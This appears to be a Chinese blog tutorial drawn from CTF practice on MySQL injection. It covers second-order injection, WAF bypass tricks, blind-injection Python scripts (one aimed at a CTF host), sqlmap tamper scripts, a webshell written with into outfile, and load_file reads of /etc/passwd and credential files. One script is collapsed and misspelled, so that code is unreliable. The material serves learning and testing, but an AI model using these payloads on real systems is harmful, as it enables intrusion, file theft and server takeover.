<p><a href=""><img src="1419450-20190109154139075-316407580.png" alt="img"></a></p>
<p>至此二次查询的原理就是这样，在ctf中曾做过一道二次查询的题目</p>
<p>题目攻击方式大致是通过注册，如果执行成功主页和执行失败的主页是有区别的，然后写python脚本盲注得出flag</p>
<p>其中用户名的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">代入数据库前完整代码可能是</span><br><span class="line">insert into user values(&#x27;id&#x27;,&#x27;\&#x27;or if((length((select database()))&gt;0),1,0) or\&#x27;&#x27;,&#x27;password&#x27;)</span><br><span class="line"></span><br><span class="line">取出数据时候的情况即</span><br><span class="line">$username = $ans[&#x27;username&#x27;]　　　　#$username = &#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">第二次拼接的情况</span><br><span class="line">mysql_query(&quot;select * from user where username = &#x27;&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;&#x27; &quot;)</span><br></pre></td></tr></table></figure>

<p> 那么还存在一种情况就是拼接的字段是id，但是id我们不可控,比如（当然该条件有个限制即 ‘(单引号) 没有被转义!!!!!!）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;insert into userinfo values(&#x27;4&#x27;,&#x27;$username&#x27;, &#x27;$password&#x27;, &#x27;$email&#x27;)&quot;);</span><br><span class="line"></span><br><span class="line">查询语句根据username取出数据库内容，再把id拼接到查询语句</span><br><span class="line">$id = $ans[&#x27;Id&#x27;];</span><br><span class="line">mysql_query(&quot;select * from userinfo where id = $id &quot;)</span><br></pre></td></tr></table></figure>

<p>这时候我们可以控制$email参数，做到写入多组记录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com</span><br></pre></td></tr></table></figure>

<p>可以看到一口气注册了2个账号，而5号账号是我可控的（我将源代码中input.php的addslashes给去除了）</p>
<p><a href=""><img src="1419450-20190109160153899-695737626.png" alt="img"></a></p>
<p>类比下，如果只有中间的password我们可控的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com&#x27;),(&#x27;6&#x27;,&#x27;myname&#x27;,&#x27;password2　　　　#这样会出现3组数据</span><br><span class="line">或者</span><br><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha　 　　　　　　　　　　　　　　　　　　　　　　　　　　　#这样就出现2组数据</span><br></pre></td></tr></table></figure>

<p><strong>0x02bypass:</strong></p>
<p>写bypass总有些心虚，因为自己知道的不多23333</p>
<p><strong>双写绕过清空</strong></p>
<p>有些waf是用preg_match将非法字符替换为空，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = preg_match(&quot;/union|select/i&quot;, &quot;&quot;, $sql)</span><br></pre></td></tr></table></figure>

<p>它不是把你数据直接挡掉报错，而是处理后仍然通行，在有/xx/i忽视大小写可以双写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selselectect  ==去掉其中的select==&gt; sel去掉的ect ==&gt; select</span><br></pre></td></tr></table></figure>

<p><strong>url和base64编码</strong></p>
<p>其实这不怎么算bypass，但是有些书上也这么讲，这里稍微写下</p>
<p>在有些代码中会对参数进行base64解码，url解码等操作，如果这些操作在转义或者waf之后的话，就会逃过过滤达到注入的效果</p>
<p>如果在处理之前的话就没有作用啦</p>
<p><strong>内敛注释</strong></p>
<p>在有些在后台代码上对关键字并未过滤，但是之后会经过安全软件，再存入数据库，有时候内敛注释可以骗过安全软件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/　　　　#其中的union是会执行的</span><br></pre></td></tr></table></figure>

<p><strong>空格被过滤</strong></p>
<p>有2中办法，通过括号或者/**/来完成不需要空格也能执行的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;/**/union/**/select/**/1,2,3,4/**/#</span><br><span class="line">xx&#x27;union select(1),(2),(3)#空格有个问题，它是将参数括起来来绕过空格，但是如果2个关键字比如这里的union和select没法一个当另一个的参数，于是有时候这个方法也不灵</span><br></pre></td></tr></table></figure>

<p><strong>单引号的过滤</strong></p>
<p>虽然sql注入第一步就是将单引号逃逸出来，但是有时候单引号逃逸了后会在单引号前面加些奇怪的东西，比如GBK宽字节注入</p>
<p>这时候可以hex编码</p>
<p>‘内容’ 等价于 0x内容的十六进制编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;   = 0x616263</span><br></pre></td></tr></table></figure>

<p><strong>特别的sprintf</strong></p>
<p>有些时候会用sprintf来包裹sql语句，但是sprintf这个函数有个问题在，非正常的地方输入%,会提示warning（如果没有用@禁止的话）</p>
<p>利用方法，用 %1$’ 代替 ‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  ==&gt; %1$&#x27;</span><br><span class="line">%1$&#x27;or 1=1 #</span><br></pre></td></tr></table></figure>

<p><strong>关键字的绕过</strong></p>
<p>在总结一中归纳了 ,(逗号) 被过滤的方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(exp1, exp2, exp3)   =&gt;  case when exp1 then exp2 else exp3 end</span><br><span class="line"></span><br><span class="line">substr(exp1, 1, 1)     =&gt; substr(exp1) from 1 for 1</span><br></pre></td></tr></table></figure>

<p>如果 and 和 or 被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and   =&gt; &amp;&amp;</span><br><span class="line">or    =&gt; ||</span><br></pre></td></tr></table></figure>

<p>如果where被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=&#x27;1&#x27;   =&gt;  order by id having id=&#x27;1&#x27; </span><br></pre></td></tr></table></figure>

<p>如果’=’被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=&#x27;    =&gt;  &#x27;&lt;&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>如果’&lt;’,’&gt;’,’=’被过滤了，但是要设置范围</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1   ==&gt; id between 1 and 1</span><br></pre></td></tr></table></figure>

<p><strong>关于json的编码</strong></p>
<p>之前做18年HCTF的时候，一道简单的代码审计题，会将cookie中的值代入waf中，然后再进入数据库</p>
<p>关键点在于在经过waf后，它会进行json的解码。</p>
<p>在json解码中有个Unicode的编码问题，有兴趣大家可以百度下，我这里直接写利用方法</p>
<p>json编码可以用\u00xx (xx为16进制ascii码)来用Unicode来编码对应字符。如果waf在json_decode之前，那么可以通过这个方法绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\u0075&#x27;  ==&gt;  &#x27;u&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>0x03python脚本</strong></p>
<p>sqlmap十分强大，但是就算是level5，有时候也会被特别的waf给拦截，调用它的bypass模块又记不住。这里就总结下自己怎么写盲注python脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;xxxx&quot;flag = &quot;&quot;</span><br><span class="line">s = reuqests.session()　　　　　　#获取会话for i in range(100):　　　　　　 #在bool还是延时注入的时候都要一个个试，假设我们这里不知道目标字段的长度就稍微设置个合适的　　for j in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_-,.&quot;:　　　　#这个是可能的字符，一个个试呗　　　　payload = &quot;xx&#x27; or if((substr(database())=&quot; + str(j) + &quot;,&quot; + str(i) + &quot;,1),1,0) #&quot; 　　　　　　#手工测出来有效的payload，当然实际情况会根据waf变个型　　　　data = &#123;　　　　　　&#x27;username&#x27;:&#x27;payload&#x27;,　　　　　　&#x27;password&#x27;:&#x27;123&#x27;　　　　&#125;　　　　s.post(url,data=data)　　#发送数据　　　　if &quot;right&quot; in s.text ：　　#如果返回值有在sql语句成功后有不同于失败的时候的回显，将该回显当做判定　　　　　　flag += str(j)　　　　　　print flag　　　　　　beak</span><br></pre></td></tr></table></figure>

<p>那么我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本</p>
<p>在sqlmap文件夹下的/tamper/下，自己创建个py文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.replace(&quot;&#x27;&quot;,&quot;%1$&#x27;&quot;)　　　　　　#将什么替换成什么</span><br><span class="line">    payload = payload.replace(&quot;u&quot;,&quot;\u0075&quot;)　　　　  #将什么替换成什么，可以写很多个</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<p>在sqlmap使用的时候调用这个模块，即可使用自定义过程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --tamper=模块名.py -u &#x27;http://xxx.xx.xx.xx/ddd.php?id=1&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>0x04将结果写入文件达到getshell</strong></p>
<p>写入文件的前提是outfile这个关键字没有被禁止，并且知道web站点的绝对路径</p>
<p>使用方法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27; into outfile &#x27;/var/www/html/sijidou.php&#x27; #</span><br></pre></td></tr></table></figure>

<h1 id="mysql-load-file使用"><a href="#mysql-load-file使用" class="headerlink" title="mysql load_file使用"></a><strong>mysql load_file使用</strong></h1><p>load_file函数只有满足两个条件就可以使用：</p>
<p>1、文件权限：chmod a+x pathtofile</p>
<p>2、文件大小: 必须小于max_allowed_packet</p>
<p>例子：</p>
<p>select load_file(‘D:\xampp\htdocs\www\wanju\htaccess.txt’)</p>
<p>select load_file(‘/etc/hosts’)</p>
<p>例如上面的例子是有条件限制的：</p>
<p>1、必须有权限读取并且文件必须完全可读。</p>
<p>  and (select count(*) from mysql.user)&gt;0 /<em>如果结果返回正常，说明具有读写权限.</em>/</p>
<p>  and (select count(<em>) from mysql.user)&gt;0 /</em> 返回错误，应该是管理员给数据库账户降权了*/</p>
<p>2、欲读取文件必须在服务器上</p>
<p>3、必须指定文件完整的路径</p>
<p>4、欲读取文件必须小于max_allowed_packet</p>
<p>　　如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限。</p>
<p>在windows下，如果NTFS设置得当，是不能读取相关的文件的，当遇到administrators才能访问的文件，</p>
<p>users就不能实现用load_file读取文件了。</p>
<p>在实际的注入中，我们有两个难点需要解决：</p>
<p>1、绝对物理路径。</p>
<p>2、构造有效的畸形语句。</p>
<p> 　在很多PHP程序中，当提交一个错误的查询时，如果display_errors=on，程序就会暴露web目录的绝对路径，只有知道</p>
<p>路径，那么对于一个可以注入的PHP程序来说，整个服务器的安全将受到严重的威胁。</p>
<p>利用：</p>
<p>　　我们假设一个程序的SQL语句如下：</p>
<p>select * from article where articleid=$id  (当前条件：magic_quotes_gpc = off, c:/boot.ini可读）</p>
<p>此时，我们构造$id为：</p>
<p>-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p>
<p>我们的查询语句就变成：</p>
<p>select * from article where articleid=-1 union select 1,1,1,1,load_file(‘c:/boot.ini’)</p>
<p>程序就会把c:/boot.ini内容老老实实显示出来，但是现在magic_quotes_gpc=off的主机少之又少，怎么才能构造处没有</p>
<p>引号的语句呢？</p>
<p>char()函数或者把字符转换成16进制。</p>
<p>注：当前条件为<code>magic_quotes_gpc=on, c:/boot.ini</code>可读。</p>
<p>我们构造$id为：</p>
<p><code>-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p>
<p><code>&quot;char(99,58,47,98,111,111,116,46,105,110,105)&quot;</code>就是“c:/boot.ini”的ASCII代码。</p>
<p>我们的查询语句就变成：</p>
<p><code>select * from article where articleid=-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</code></p>
<p>这样我们也可以成功读取boot.ini文件，还有把字符转换为16进制的：</p>
<p>“c:/boot.ini”的十六进制是”0x633a2f626f6f742e696e69”,所以上面的语句就变成：</p>
<p><code>select * from article where articleid=-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)</code></p>
<p>当然，在实际应用中，由于种种条件限制，文件的内容未必会显示出来，我们可以用into outfile把文件导出。</p>
<hr>
<p>关于mysql into outfile注射，要使用into outfile 把代码写到web目录取得webshell首先需要3大先天条件：</p>
<p>1、知道物理路径（into outfule ‘物理路径’), 这样才能写对目录。</p>
<p>2、能够使用union （需要mysql 3以上的版本）</p>
<p>3、对方没有对(‘)进行过滤（因为outfile后面的（’’)不可以用其他函数代替转换）</p>
<p>后天条件需要二个：</p>
<p>1、就是mysql用户拥有file_priv权限（不然就不能写文件或读文件）</p>
<p>2、对web目录有写权限MS的系统就不说了，一般都会有权限的，但是*nix的系统，通常都是rwxr-xr-x，也就是</p>
<p>   说组跟其他用户都没有权限写操作，所以，要满足这5大条件还是蛮高难度的。</p>
<hr>
<p>mysql的load_file()常见的用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">1、replace(load_file(0×2F6574632F706173737764), 0x3c, 0x20)</span><br><span class="line"></span><br><span class="line">2、replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line"></span><br><span class="line">上面两个是查看一些php文件里完全显示代码。有些时候不替换一些字符，如&quot;&lt;&quot;替换成&quot;空格&quot;,返回的是网页。</span><br><span class="line"></span><br><span class="line">而无法查看到代码。</span><br><span class="line"></span><br><span class="line">3、load_file(char(47))可以列出FreeBSD, Sunos系统根目录。</span><br><span class="line"></span><br><span class="line">4、/etc/httpd/conf/httpd.conf或者/usr/local/apache/conf/httpd.conf查看linux apache虚拟主机配置文件。</span><br><span class="line"></span><br><span class="line">5、c:/Program Files/Apache Group/Apache/conf/httpd.conf或c:/apache/conf/httpd.conf 查看windows系统</span><br><span class="line"></span><br><span class="line">　　apache文件。</span><br><span class="line"></span><br><span class="line">6、c:/Resin-3.0.14/conf/resin.conf 或c:/Resin/conf/resin.conf 查看jsp开发网站的resin文件配置信息。</span><br><span class="line"></span><br><span class="line">7、/usr/local/resin/conf/resin.cof  查看linux系统配置的JSP虚拟主机</span><br><span class="line"></span><br><span class="line">8、d:/apache/apache2/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">9、c:/Program Files/mysql.my.ini</span><br><span class="line"></span><br><span class="line">10、../themes/darkblue_orange/layout.inc.php  phpmyadmin 爆路径</span><br><span class="line"></span><br><span class="line">11、c:/windows/system32/inetsrv/MetaBase.xml 查看IIS的虚拟主机配置文件</span><br><span class="line"></span><br><span class="line">12、/usr/local/resin-3.0.22/conf/resin.conf  或/usr/local/resin-pro-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</span><br><span class="line"></span><br><span class="line">13、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</span><br><span class="line"></span><br><span class="line">14、/etc/sysconfig/iptables 查看防火墙策略</span><br><span class="line"></span><br><span class="line">15、usr/local/app/php5/lib/php.ini  PHP 的设置</span><br><span class="line"></span><br><span class="line">16、/etc/my.cnf  MYSQL的配置文件</span><br><span class="line"></span><br><span class="line">17、/etc/redhat-release 红帽子的系统版本</span><br><span class="line"></span><br><span class="line">18、c:/mysql/data/mysql/user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line"></span><br><span class="line">19、/etc/sysconfig/network-scripts/ifcfg-eth0 查看IP.</span><br><span class="line"></span><br><span class="line">20、/usr/local/app/apache2/conf/extra/httpd-vhosts.conf  虚拟网站设置</span><br><span class="line"></span><br><span class="line">21、c:/windows/my.ini</span><br></pre></td></tr></table></figure>



<h1 id="loacte"><a href="#loacte" class="headerlink" title="loacte()"></a>loacte()</h1><p><code>Locate()</code><br><code>LOCATE(substr,str) , LOCATE(substr,str,pos) </code><br>第一个语法返回字符串 str中子字符串substr的第一个出现位置。第二个语法返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0。</p>
<p>这里主要利用第二个语法进行报错注入：</p>
<p>假设数据库名为security</p>
<p>首先从最基本的：</p>
<p><code>locate(‘s’,(select database()),1)</code></p>
<p>表示查询数据库名，并且是从第一位开始，返回字符s第一次出现的位置。</p>
<p>但是仅凭这一句是无法获取特别有用的信息的，但是可以在构造</p>
<p><code>locate(‘s’,(select database()),1)=1</code></p>
<p>查询数据库名的第一位开始，如果存在s,并且s的位置等于1，那么等式成立。</p>
<p>综合利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘s’,(select database()),1)=1)</span><br></pre></td></tr></table></figure>

<p>如果返回值正常，我们就可以认为第一位是s,同理构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(‘X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure>

<p>将x遍历，n从1开始增加，即可。</p>
<p>不过还有个问题：mysql对字段名的大小写是不敏感的，也就是说会同时出现S和s 满足，都会被记录。</p>
<p>这里可以用binary修饰，表示二进制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username from security.users where id=1 and (locate(binary’X’,(select database()),n)=n)</span><br></pre></td></tr></table></figure>

<p>附上脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">rs = requests.session()</span><br><span class="line">url0=&quot;http://120.24.86.145:9004/Once_More.php&quot;</span><br><span class="line">def locate():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    for j in range(1, 100):</span><br><span class="line">        char_all = &#x27;!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~&#x27;</span><br><span class="line">        key = 0</span><br><span class="line">        for i in char_all:</span><br><span class="line">            url = url0+&quot;?id=1&#x27;and  (select locate(binary&#x27;&quot; + str(</span><br><span class="line">                i) + &quot;&#x27;,(select database() limit 0,1),&quot; + str(</span><br><span class="line">                j) + &quot;))=&quot; + str(j) + &quot;%23&quot;</span><br><span class="line">            r1 = rs.get(url)</span><br><span class="line">            print (url)</span><br><span class="line">            if &quot;Hello&quot; in r1.text:</span><br><span class="line">                print(str(i) + &quot; -----&quot; + str(j))</span><br><span class="line">                flag += str(i)</span><br><span class="line">                print(&quot;[*] : &quot; + flag)</span><br><span class="line">                key = 1</span><br><span class="line">        if key == 0:</span><br><span class="line">            break</span><br><span class="line">locate()</span><br></pre></td></tr></table></figure>





<h1 id="Sqlmap-Tamper-编写"><a href="#Sqlmap-Tamper-编写" class="headerlink" title="Sqlmap Tamper 编写"></a>Sqlmap Tamper 编写</h1><p>从零开始写tamper</p>
<p>简单介绍tamper</p>
<p>sqlmap的<code>--tamper</code>参数可以引入用户自定义的脚本来修改注入时的payload，由此可以使用tamper来绕过waf，替换被过滤的关键字等。这是一个基本的tamper结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line">__priority__ = PRIORITY.LOW <span class="comment"># 当前脚本调用优先等级</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span> <span class="comment"># 声明当前脚本适用/不适用的范围，可以为空。</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span> <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>需要把他保存为 <code>my.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=my</code> 就行了</p>
<p>简单分析</p>
<p>拿官方的一个tamper来分析下结构</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomIP</span>():</span></span><br><span class="line">    numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> numbers <span class="keyword">or</span> numbers[<span class="number">0</span>] <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">172</span>, <span class="number">192</span>):</span><br><span class="line">        numbers = random.sample(xrange(<span class="number">1</span>, <span class="number">255</span>), <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>分为了import部分、<code>__priority__</code> 属性、dependencies函数、tamper函数以及用户自定义的函数</p>
<p>import</p>
<p>这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的<code>PRIORITY</code>就来源于<code>sqlmap/lib/core/enums.py</code></p>
<p>PRIORITY</p>
<p>PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</p>
<ul>
<li>LOWEST = -100</li>
<li>LOWER = -50</li>
<li>LOW = -10</li>
<li>NORMAL = 0</li>
<li>HIGH = 10</li>
<li>HIGHER = 50</li>
<li>HIGHEST = 100</li>
</ul>
<p>如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</p>
<p>dependencies</p>
<p>dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:</p>
